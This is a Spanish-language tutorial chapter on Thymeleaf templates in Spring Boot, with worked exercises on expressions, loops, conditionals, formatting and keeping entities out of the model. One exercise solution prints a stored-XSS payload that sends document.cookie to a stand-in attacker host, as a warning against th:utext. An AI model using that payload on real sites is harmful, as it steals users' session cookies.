# Thymeleaf esencial

Todo lo que necesitas para pintar datos está en unas quince etiquetas y cuatro tipos de expresión. Este tema es la caja de herramientas; los siguientes son el taller.

## 1. Arranque: dependencia y convenios

!!! analogia "Analogía"
    Una plantilla Thymeleaf es un **impreso oficial**: el papel ya está impreso con los rótulos y los recuadros, y solo se rellenan los huecos. Y como los huecos llevan dentro un valor de muestra, el impreso en blanco se puede leer tal cual —abres el `.html` en el navegador y se ve—, que es justo lo que no pasa con otros motores de plantillas.

```xml title="pom.xml"
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-thymeleaf</artifactId>
</dependency>
```

Con eso Spring Boot ya sabe dónde buscar:

``` { .text .sinajuste }
src/main/resources/
├── templates/          ← las plantillas .html  (NO accesibles por URL)
│   ├── productos/
│   │   ├── lista.html
│   │   └── detalle.html
│   └── fragmentos/
└── static/             ← css, js, imágenes    (SÍ accesibles por URL)
    ├── css/estilo.css
    └── img/logo.svg
```

La distinción importa: `templates/` lo renderiza el servidor y **nadie puede pedirlo por URL**; `static/` se sirve tal cual.

En desarrollo, para no reiniciar en cada cambio de plantilla:

```yaml
spring.thymeleaf.cache: false     # solo en el perfil dev
```

Y el espacio de nombres, que activa el autocompletado del IDE:

```html
<html xmlns:th="http://www.thymeleaf.org">
```

## 2. Los cuatro símbolos que hay que distinguir

Es el punto donde más se equivoca todo el mundo, así que va en tabla y con ejemplo:

| Símbolo | Se llama | Para qué | Ejemplo |
|:-:|---|---|---|
| `${...}` | variable | leer del modelo | `${producto.nombre}` |
| `*{...}` | selección | leer del objeto ya fijado con `th:object` | `*{nombre}` |
| `@{...}` | enlace | construir URLs | `@{/productos/{id}(id=${p.id})}` |
| `#{...}` | mensaje | textos traducidos | `#{producto.titulo}` |

!!! danger "Usa `@{...}` para TODAS las URLs"
    Escribir `href="/productos"` funciona… hasta que despliegas la aplicación bajo un contexto (`/tienda/productos`) y todos los enlaces se rompen a la vez.

    `th:href="@{/productos}"` añade el contexto solo. Es una línea de diferencia y una tarde de depuración.

## 3. Pintar valores

```html
<h1 th:text="${producto.nombre}">Nombre de ejemplo</h1>
<p  th:text="|Quedan ${producto.stock} unidades|">Quedan 0</p>
<p  th:utext="${descripcionHtml}">Texto con &lt;b&gt;etiquetas&lt;/b&gt;</p>
<span>[[${producto.precio}]] €</span>
```

- `th:text` **sustituye el contenido** de la etiqueta y **escapa el HTML**.
- Las barras verticales `|...|` son *literal substitution*: interpolan sin concatenar con `+`.
- `[[...]]` inserta en mitad de un texto, sin necesidad de una etiqueta que envolver.

!!! danger "`th:utext` es una puerta a XSS"
    La `u` es de *unescaped*: escribe el HTML sin escapar. Si ese texto viene de un usuario, acabas de regalar tu web.

    Úsalo solo con contenido que hayas generado tú o que hayas limpiado antes con una librería de saneado. En el examen, un `th:utext` sobre datos de formulario es un fallo grave de seguridad.

## 4. Repetir: `th:each`

```html
<tr th:each="p : ${productos}">
    <td th:text="${p.nombre}">Teclado</td>
    <td th:text="${#numbers.formatDecimal(p.precio, 1, 2)} + ' €'">29,90 €</td>
</tr>
```

Con estado de iteración, cuando necesitas el índice o alternar estilos:

```html
<tr th:each="p, i : ${productos}" th:class="${i.odd} ? 'gris' : 'blanco'">
    <td th:text="${i.count}">1</td>
    <td th:text="${p.nombre}">Teclado</td>
</tr>
```

El objeto de estado trae `index` (desde 0), `count` (desde 1), `size`, `first`, `last`, `even`, `odd`.

**La lista vacía hay que tratarla siempre.** Una tabla sin filas y sin mensaje parece una página rota:

```html
<tr th:if="${#lists.isEmpty(productos)}">
    <td colspan="3">No hay productos que mostrar.</td>
</tr>
```

## 5. Decidir: `th:if`, `th:unless`, `th:switch`

```html
<span th:if="${p.stock > 0}"  class="ok">Disponible</span>
<span th:unless="${p.stock > 0}" class="ko">Agotado</span>

<div th:switch="${pedido.estado}">
    <span th:case="'PENDIENTE'">Pendiente</span>
    <span th:case="'ENVIADO'">Enviado</span>
    <span th:case="*">Estado desconocido</span>
</div>
```

Y el operador *elvis*, que ahorra muchos `th:if`:

```html
<td th:text="${p.descripcion} ?: 'Sin descripción'">—</td>
```

!!! warning "`th:if` no oculta: elimina"
    Cuando la condición es falsa, la etiqueta **no llega al HTML**. No está oculta con CSS: no existe. Si abres el inspector del navegador no la vas a encontrar, y eso confunde mucho la primera vez.

    Para ocultar sin eliminar, usa una clase CSS.

## 6. Atributos: `th:attr` y sus atajos

```html
<img th:src="@{/img/{f}(f=${p.imagen})}" th:alt="${p.nombre}">
<a th:href="@{/productos/{id}(id=${p.id})}">Ver</a>
<input th:value="${p.nombre}">
<option th:selected="${p.id == seleccionadoId}">…</option>
<button th:disabled="${p.stock == 0}">Comprar</button>
```

Los atributos booleanos (`selected`, `disabled`, `checked`, `readonly`) se comportan bien: si la expresión es falsa, el atributo **no aparece**, que es justo lo que exige el HTML.

Para clases que se acumulan, `th:classappend` en vez de `th:class`, que machacaría las existentes:

```html
<tr class="fila" th:classappend="${p.stock == 0} ? 'agotado'">
```

## 7. Los objetos de utilidad

Thymeleaf trae ayudantes para lo que siempre hace falta:

```html
<!-- Fechas -->
<td th:text="${#temporals.format(pedido.fecha, 'dd/MM/yyyy')}">01/01/2026</td>

<!-- Números -->
<td th:text="${#numbers.formatDecimal(p.precio, 1, 'POINT', 2, 'COMMA')}">1.234,56</td>

<!-- Cadenas -->
<td th:text="${#strings.abbreviate(p.descripcion, 60)}">…</td>
<td th:if="${#strings.isEmpty(p.notas)}">sin notas</td>

<!-- Listas -->
<span th:text="${#lists.size(productos)}">0</span>
```

!!! tip "Poca lógica en la plantilla"
    `#numbers` y `#temporals` son para **formatear**. Si te encuentras calculando en la plantilla —sumar totales, aplicar descuentos, decidir un estado—, eso es lógica de negocio y va en el servicio o en el DTO.

    Regla que se aplica en el examen: si una expresión de Thymeleaf no cabe cómoda en una línea, está mal colocada.

## 8. El modelo, visto desde el controlador

```java
@GetMapping
public String listar(@RequestParam(required = false) String buscar, Model modelo) {
    modelo.addAttribute("productos", servicio.buscar(buscar));
    modelo.addAttribute("buscado", buscar);
    modelo.addAttribute("titulo", "Catálogo");
    return "productos/lista";
}
```

Lo que metes en el `Model` es lo que la plantilla puede leer con `${...}`. Nada más.

**Atributos comunes a todas las páginas** —el usuario, el número de avisos, el año del pie— sin repetirlos en cada método:

```java
@ControllerAdvice
public class AtributosGlobales {
    @ModelAttribute("anio")
    public int anio() { return Year.now().getValue(); }
}
```

!!! danger "Nunca metas la entidad en el modelo"
    Es el mismo error de la UT4 con los DTO, disfrazado. Si pasas la entidad, la plantilla puede recorrer sus relaciones (`${pedido.cliente.direccion}`) y disparar consultas a la base de datos **durante el renderizado**, con la transacción ya cerrada.

    Resultado típico: `LazyInitializationException` en mitad de la página, o el N+1 que cazaste en la UT5 volviendo por la puerta de atrás.

    Al modelo van **DTO**, montados dentro del servicio.

## 9. Objetos del entorno web

```html
<p th:text="${#request.requestURI}">/productos</p>
<p th:text="${session.usuario}">anónimo</p>
<p th:text="${param.pagina}">1</p>
```

Útiles con moderación. Cuanto más dependa la plantilla del `HttpServletRequest`, menos se puede probar.

## Pruébalo ahora (15 min)

!!! reto "Trabaja tú ahora"
    Este bloque se hace **en clase, en tu equipo**. No se entrega ni puntúa: es la práctica que hace que el examen te salga.

Una sola plantilla que usa **todo** lo del tema. Cópiala, arráncala y ve tocando.

``` { .java .numerado title="CatalogoController.java" }
@Controller
@RequestMapping("/catalogo")
public class CatalogoController {

    record ProductoDto(Long id, String nombre, String categoria,
                       BigDecimal precio, int stock, String descripcion) {}

    private final List<ProductoDto> datos = List.of(
        new ProductoDto(1L, "Teclado mecánico", "informática",
                        new BigDecimal("89.90"), 12, "Switches marrones"),
        new ProductoDto(2L, "Ratón vertical", "informática",
                        new BigDecimal("45.50"), 0, null),
        new ProductoDto(3L, "Monitor 27\"", "informática",
                        new BigDecimal("249.00"), 3, "IPS, 75 Hz"));

    @GetMapping
    public String listar(Model modelo) {
        modelo.addAttribute("productos", datos);
        modelo.addAttribute("titulo", "Catálogo");
        return "catalogo";
    }
}
```

``` { .html .numerado title="templates/catalogo.html" }
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title th:text="${titulo}">Catálogo</title>
</head>
<body>
    <h1 th:text="|${titulo}: [[${#lists.size(productos)}]] artículos|">Catálogo</h1>

    <table>
        <tr th:each="p, i : ${productos}"
            class="fila"
            th:classappend="${p.stock == 0} ? 'agotado'">

            <td th:text="${i.count}">1</td>
            <td th:text="${p.nombre}">Teclado</td>
            <td th:text="${p.descripcion} ?: 'Sin descripción'">—</td>
            <td th:text="${#numbers.formatDecimal(p.precio, 1, 'POINT', 2, 'COMMA')} + ' €'">0,00 €</td>

            <td>
                <span th:if="${p.stock > 0}" th:text="|${p.stock} uds.|">0 uds.</span>
                <span th:unless="${p.stock > 0}">Agotado</span>
            </td>

            <td>
                <a th:href="@{/catalogo/{id}(id=${p.id})}">Ver</a>
                <button th:disabled="${p.stock == 0}">Comprar</button>
            </td>
        </tr>

        <tr th:if="${#lists.isEmpty(productos)}">
            <td colspan="6">No hay productos que mostrar.</td>
        </tr>
    </table>
</body>
</html>
```

Con la página abierta, haz estas cuatro cosas y **mira el código fuente** después de cada una:

1. Cambia `th:if="${p.stock > 0}"` por `th:unless` y observa que la etiqueta **desaparece** del HTML, no se oculta.
2. Devuelve una lista vacía desde el controlador. Comprueba que sale el mensaje.
3. Quita el `?: 'Sin descripción'` y mira qué pinta el ratón vertical, que la tiene a `null`.
4. Busca en el código fuente el `href` del enlace: verás `/catalogo/1`, no `@{...}`.

---

## Ejercicios (con solución)

### Ejercicio 1 — Los cuatro símbolos

Di qué hace cada uno y pon un ejemplo: `${...}`, `*{...}`, `@{...}`, `#{...}`.

??? success "Solución"

    | Símbolo | Qué hace | Ejemplo |
    |:-:|---|---|
    | `${...}` | Lee una **variable del modelo** | `th:text="${producto.nombre}"` |
    | `*{...}` | Lee **dentro del objeto** fijado con `th:object` | `<form th:object="${form}">` → `th:field="*{nombre}"` |
    | `@{...}` | Construye una **URL** añadiendo el contexto | `th:href="@{/productos/{id}(id=${p.id})}"` |
    | `#{...}` | Saca un **texto traducido** de `messages.properties` | `th:text="#{catalogo.titulo}"` |

    El que más se confunde es `*{...}`: **solo funciona dentro de una etiqueta con `th:object`**. Fuera de ahí no encuentra nada.

### Ejercicio 2 — `@{...}` frente a `href`

¿Por qué `th:href="@{/productos}"` y no `href="/productos"`? Describe el día exacto en que se rompe.

??? success "Solución"

    Porque `@{...}` **antepone el contexto de la aplicación** y `href` no.

    En local la aplicación vive en `http://localhost:8080/`, así que `/productos` funciona y las dos formas parecen iguales.

    El día que se rompe: despliegas el `.war` en un Tomcat compartido, o pones un proxy delante, y la aplicación pasa a vivir en `https://servidor/tienda/`. Ahora la dirección buena es `/tienda/productos`, pero tus `href="/productos"` siguen apuntando a la raíz del servidor. **Todos los enlaces caen a la vez** y la página se queda sin CSS, porque el `<link>` estaba escrito igual.

    Con `@{...}` no hay que tocar nada: Thymeleaf escribe `/tienda/productos` solo.

### Ejercicio 3 — `th:text` o `th:utext`

¿Qué diferencia hay, y cuándo es peligroso el segundo?

??? success "Solución"

    `th:text` **escapa** el HTML: convierte `<` en `&lt;`. Si el valor es `<b>hola</b>`, en pantalla se lee literalmente `<b>hola</b>`.

    `th:utext` (*unescaped*) lo escribe tal cual, y el navegador lo interpreta como HTML.

    Es peligroso **en cuanto el texto venga del usuario**. Si alguien guarda esto como descripción de un producto:

    ```html
    <script>fetch('http://malo.example/'+document.cookie)</script>
    ```

    con `th:utext` ese script se ejecuta en el navegador de cualquiera que abra la página, y se lleva las cookies de sesión. Es un XSS almacenado, de los graves.

    **Regla:** `th:utext` solo con HTML que hayas generado tú, o que hayas saneado antes con una librería. En el examen, un `th:utext` sobre datos de formulario cuenta como fallo de seguridad.

### Ejercicio 4 — La tabla de pedidos

Pinta una tabla de pedidos con número de fila, fecha formateada como `dd/MM/yyyy`, importe con dos decimales, y un mensaje si la lista viene vacía.

??? success "Solución"

    ```html
    <table>
        <tr th:each="pd, i : ${pedidos}">
            <td th:text="${i.count}">1</td>
            <td th:text="${#temporals.format(pd.fecha, 'dd/MM/yyyy')}">01/01/2026</td>
            <td th:text="${#numbers.formatDecimal(pd.importe, 1, 'POINT', 2, 'COMMA')} + ' €'">0,00 €</td>
        </tr>
        <tr th:if="${#lists.isEmpty(pedidos)}">
            <td colspan="3">Todavía no hay pedidos.</td>
        </tr>
    </table>
    ```

    Tres detalles que se puntúan:

    - `i.count` empieza en **1**; `i.index` empieza en 0.
    - `#temporals` es para `LocalDate` y compañía. Para `java.util.Date` sería `#dates`, que ya no deberías estar usando.
    - **La lista vacía se trata siempre.** Una tabla sin filas y sin mensaje parece una página rota.

### Ejercicio 5 — El IVA en la plantilla

Un compañero escribe esto. ¿Qué le dices y dónde debería estar?

```html
<td th:text="${p.precio} * 1.21 * (1 - ${p.descuento}) + ' €'">0 €</td>
```

??? success "Solución"

    Tres problemas, de menos a más grave:

    1. **Es lógica de negocio en la vista.** El IVA y el descuento son reglas del negocio: si mañana el IVA cambia, hay que buscarlo por las plantillas en vez de tocarlo en un sitio.
    2. **No se puede probar.** Un test unitario cubre un método del servicio; nadie prueba una expresión de Thymeleaf.
    3. **Está multiplicando un `BigDecimal` por un decimal en coma flotante**, que es justo lo que se aprendió a no hacer con dinero.

    Dónde va: **se calcula en el servicio y llega al modelo ya calculado**, en un campo del DTO:

    ```java
    record LineaDto(String nombre, BigDecimal precioFinal) {}
    ```

    ```html
    <td th:text="${#numbers.formatDecimal(l.precioFinal, 1, 'POINT', 2, 'COMMA')} + ' €'">0,00 €</td>
    ```

    La regla del módulo: **si una expresión de Thymeleaf no cabe cómoda en una línea, está mal colocada.**

### Ejercicio 6 — La entidad en el modelo

¿Qué pasa si metes una entidad JPA con relaciones perezosas en el `Model`? Nombra el error concreto.

??? success "Solución"

    Que la plantilla puede recorrer las relaciones (`${pedido.cliente.direccion}`) **durante el renderizado**, que ocurre después de que el servicio haya terminado y la transacción se haya cerrado.

    Al no haber sesión de persistencia abierta, salta:

    ``` { .text .sinajuste }
    org.hibernate.LazyInitializationException: could not initialize proxy - no Session
    ```

    Y si la aplicación tiene `spring.jpa.open-in-view` activado —que viene así por defecto— no falla, pero pasa algo peor: **se dispara una consulta por cada fila de la tabla mientras se pinta la página**. Es el N+1 de la UT5, esta vez escondido en la vista, donde ninguna prueba del servicio lo va a cazar.

    La solución es la misma de la UT4: **al modelo van DTO**, montados dentro del servicio, con la transacción todavía abierta.

### Ejercicio 7 — Encuentra los tres fallos

```html
<tr th:each="p : ${productos}">
    <td th:text="${p.nombre}"></td>
    <td th:utext="${p.comentarioCliente}"></td>
    <td><a href="/productos/${p.id}">Ver</a></td>
</tr>
```

??? success "Solución"

    1. **`th:utext` sobre un comentario de cliente**: XSS almacenado. Va con `th:text`.
    2. **`href` normal con `${...}` dentro**: no se interpola nada. El navegador recibe literalmente `/productos/${p.id}`. Tiene que ser `th:href="@{/productos/{id}(id=${p.id})}"`.
    3. **Las etiquetas vacías**: no es un error de funcionamiento, pero se pierde la ventaja de Thymeleaf. Poniendo un valor de muestra dentro (`<td th:text="${p.nombre}">Teclado</td>`) la maqueta se ve al abrir el fichero sin servidor.

    Corregido:

    ```html
    <tr th:each="p : ${productos}">
        <td th:text="${p.nombre}">Teclado</td>
        <td th:text="${p.comentarioCliente}">Muy buen producto</td>
        <td><a th:href="@{/productos/{id}(id=${p.id})}">Ver</a></td>
    </tr>
    ```
